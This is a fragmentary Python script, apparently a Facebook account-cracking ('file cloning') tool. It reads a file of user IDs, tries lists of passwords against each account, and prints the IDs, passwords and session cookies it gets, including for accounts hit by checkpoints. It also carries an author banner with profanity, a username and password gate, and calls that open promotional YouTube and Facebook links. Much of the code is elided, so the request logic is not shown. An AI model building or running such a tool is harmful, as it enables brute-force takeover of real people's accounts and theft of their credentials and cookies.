#MAKED-BY-jiwan XARFAT
#GITHUB-jiwan-143
#ACTIVE FILE CLONING
#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
#DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
# =[•]=[SCRIPT]=[ADMIN]=[jiwan-XARFAT]=[•]=
#------------------[ Install-1 ]-------------------#
import os 
#-----------------[ jiwan-King ]-------------------# 
print('\033[95;5m[\x1b[38;5;50m+\033[95;5m] \x1b[38;5;50mCHECKING FOR UPDATE...? ')
...
os.system('xdg-open https://youtube.com/@npjibanff?si=4VtjrS4Oh0iS9ttw')
os.system("espeak -a 300 \"Checking, FOR, YOUTUBE, ID,\"")
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mjiwan')
...
while attemps < 12345677901:
    username = input(' \033[0;94mEnter Username: ')
    password = input(' \033[0;95mEnter Password: ')    
...
🌺════════════════🌺═════════════════════ 🌺\033[0;95m                                                                                                                                                                                                                                             
  \033[0;92m═════════════════════════════════════════════
\033[0;93m • CEO SADIM XRAFAT   FIRE (🥰)
\033[0;94m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;95m • VERSION CODE [ 5.1 ] FIRE (🌺)
\033[0;97m═════════════════════════════════════════════🌺\033[1;31m""")
def login():
	banner()
	jiwanj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	jiwanj('\033[0;97m===============================================')
	jiwan= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if jiwan in ['m']:
		public()
	elif jiwan in ['1']:
		crack_file()
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100067803001344&mibextid=ZbWKwL')
	elif jiwan in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/jiwan.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[🌺Jiban🌺] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#jiwan-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•jiwan-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#jiwan-King
				print(f'\r\033[0;92m[jiwan-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " jiwan,  Ok,  id"')
